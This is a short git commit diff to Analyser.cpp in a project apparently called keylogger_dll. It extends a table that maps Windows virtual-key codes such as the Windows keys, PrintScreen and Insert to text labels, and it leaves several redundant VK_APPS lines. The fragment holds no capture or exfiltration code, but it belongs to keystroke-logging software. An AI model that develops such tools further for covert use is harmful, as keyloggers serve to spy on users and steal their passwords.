85ee080ff167cd7d42a9fdc2ce1ecce0f1eb8024
Samuel Darracq <Samuel Darracq>
2016-11-12 16:48:54 +0100

    Analyser start

--- model/keylogger_dll/Analyser.cpp
+++ model/keylogger_dll/Analyser.cpp
@@ -17,7 +17,13 @@ void						Analyser::initMap()
 	_translateMap[VK_RCONTROL] = "[RCtrl]";
 	_translateMap[VK_LMENU] = "[LAlt]";
 	_translateMap[VK_RMENU] = "[RAlt]";
-	_translateMap[VK_LMENU] = "[LAlt]";
-	_translateMap[VK_LMENU] = "[LAlt]";
-	_translateMap[VK_LMENU] = "[LAlt]";
+	_translateMap[VK_LWIN] = "[LWindows]";
+	_translateMap[VK_RWIN] = "[RWindows]";
+	_translateMap[VK_APPS] = "[Applications]";
+	_translateMap[VK_SNAPSHOT] = "[PrintScreen]";
+	_translateMap[VK_INSERT] = "[Insert]";
+	_translateMap[VK_PAUSE] = "[Pause]";
+	_translateMap[VK_APPS] = "[Applications]";
+	_translateMap[VK_APPS] = "[Applications]";
+	_translateMap[VK_APPS] = "[Applications]";
 }
